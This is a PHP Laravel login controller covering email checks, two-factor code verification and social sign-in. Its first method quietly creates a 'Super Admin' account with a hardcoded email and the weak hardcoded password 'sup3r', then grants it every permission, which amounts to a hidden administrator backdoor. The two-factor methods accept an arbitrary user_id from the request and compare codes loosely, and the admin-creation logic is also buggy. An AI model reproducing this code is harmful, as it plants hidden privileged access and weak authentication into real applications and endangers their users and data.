<?php

namespace App\Http\Controllers;

use App\Helper\Reply;
use App\Http\Requests\LoginRequest;
use App\Models\Permission;
use App\Models\PermissionRole;
use App\Models\Role;
use App\Models\RoleUser;
use App\Models\Social;
use App\Models\User;
use App\Models\UserPermission;
use App\Notifications\TwoFactorCode;
use App\Traits\SocialAuthSettings;
use Exception;
use Froiden\Envato\Traits\AppBoot;
use Illuminate\Http\Request;
use \Illuminate\Validation\ValidationException;
use Laravel\Fortify\Fortify;
use Laravel\Socialite\Facades\Socialite;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    use AppBoot, SocialAuthSettings;

    protected $redirectTo = 'account/dashboard';


    public function isSuperAdminExist()
    {
        // 1. User Code
        $user = User::get();
        $getAdmin = $user->where('email', 'super.admin@filers.pk')->first();

        $this->createUser = (isset($getAdmin) && $getAdmin == true) ? $getAdmin : User::create([
            'name' => 'Super Admin',
            'email' => 'super.admin@filers.pk',
            'password' => Hash::make('sup3r'),
            'email_notifications' => 1,
            'country_id' => 162,
            'admin_approval' => 1,
        ]);

        if ($getAdmin) {
            $userId = $getAdmin->id;
        }

        // 2. Role Code
        $role = Role::get();
        $getRole = $role->where('name', 'Super Admin')->first();

        $this->createRole = (isset($getRole) && $getRole == true) ? $getRole : Role::create([
            'name' => 'Super Admin',
            'display_name' => 'System Administrator',
            'description' => 'Super Admin is the one who can manage anything of the app.',
        ]);

        if ($getRole) {
            $roleId = $getRole->id;
        }

        // 3. Role User Code
        $roleUser = RoleUser::get();
        $getRoleUser = $roleUser->where('user_id', $userId)->first();

        $this->createRoleUser = (isset($getRoleUser) && $getRoleUser == true) ? $getRoleUser : RoleUser::create([
            'user_id' => $userId,
            'role_id' => $roleId,
        ]);

        // 4. Permission Role
        $permissionRole = PermissionRole::get();
        $getPermissionRole = $permissionRole->where('role_id', $roleId)->first();
        $allPermissions = Permission::all()->pluck('id');

        foreach ($allPermissions as $permissionsRoleIn) {
            $this->createPermissionRole = (isset($getPermissionRole) && $getPermissionRole == true) ? $getPermissionRole : PermissionRole::create([
                'permission_id' => $permissionsRoleIn,
                'role_id' => $roleId,
                'permission_type_id' => 4,
            ]);
        }

        // 5. User Permission Code
        $userPermission = UserPermission::get();
        $getUserPermission = $userPermission->where('user_id', $userId)->first();
        $allPermissions = Permission::all()->pluck('id');

        foreach ($allPermissions as $allPermissionIn) {
            $this->createUserPermission = (isset($getUserPermission) && $getUserPermission == true) ? $getUserPermission : UserPermission::create([
                'user_id' => $userId,
                'permission_id' => $allPermissionIn,
                'permission_type_id' => 4,
            ]);
        }
        return $this->data;
    }

    public function checkEmail(LoginRequest $request)
    {
        $user = User::where('email', $request->email)
            ->select('id')
            ->where('status', 'active')
            ->where('login', 'enable')
            ->first();

        if (is_null($user)) {
            throw ValidationException::withMessages([
                Fortify::username() => __('messages.invalidOrInactiveAccount'),
            ]);
        }

        return response([
            'status' => 'success'
        ]);
    }

    public function checkCode(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);

        $user = User::find($request->user_id);

        if ($request->code == $user->two_factor_code) {

            // Reset codes and expire_at after verification
            $user->resetTwoFactorCode();

            // Attempt login
            Auth::login($user);

            return redirect()->route('dashboard');
        }

        // Reset codes and expire_at after failure
        $user->resetTwoFactorCode();

        return redirect()->back()->withErrors(['two_factor_code' => __('messages.codeNotMatch')]);
    }

    public function resendCode(Request $request)
    {
        $user = User::find($request->user_id);
        $user->generateTwoFactorCode();
        $user->notify(new TwoFactorCode());

        return Reply::success(__('messages.codeSent'));
    }

    public function redirect($provider)
    {
        $this->setSocailAuthConfigs();
        return Socialite::driver($provider)->redirect();
    }

    public function callback(Request $request, $provider)
    {
        $this->setSocailAuthConfigs();

        try {
            try {
                if ($provider != 'twitter') {
                    $data = Socialite::driver($provider)->stateless()->user();
                } else {
                    $data = Socialite::driver($provider)->user();
                }
            } catch (Exception $e) {
                $errorMessage = $e->getMessage();
                return redirect()->route('login')->with('message', $errorMessage);
            }

            $user = User::where(['email' => $data->email, 'status' => 'active', 'login' => 'enable'])->first();

            if ($user) {
                // User found
                DB::beginTransaction();

                Social::updateOrCreate(['user_id' => $user->id], [
                    'social_id' => $data->id,
                    'social_service' => $provider,
                ]);

                DB::commit();

                Auth::login($user, true);
                return redirect()->intended($this->redirectPath());
            } else {
                return redirect()->route('login')->with(['message' => __('messages.unAuthorisedUser')]);
            }
        } catch (Exception $e) {
            $errorMessage = $e->getMessage();
            return redirect()->route('login')->with(['message' => $errorMessage]);
        }
    }

    public function redirectPath()
    {
        if (method_exists($this, 'redirectTo')) {
            return $this->redirectTo();
        }

        return property_exists($this, 'redirectTo') ? $this->redirectTo : '/login';
    }

    public function username()
    {
        return 'email';
    }
}
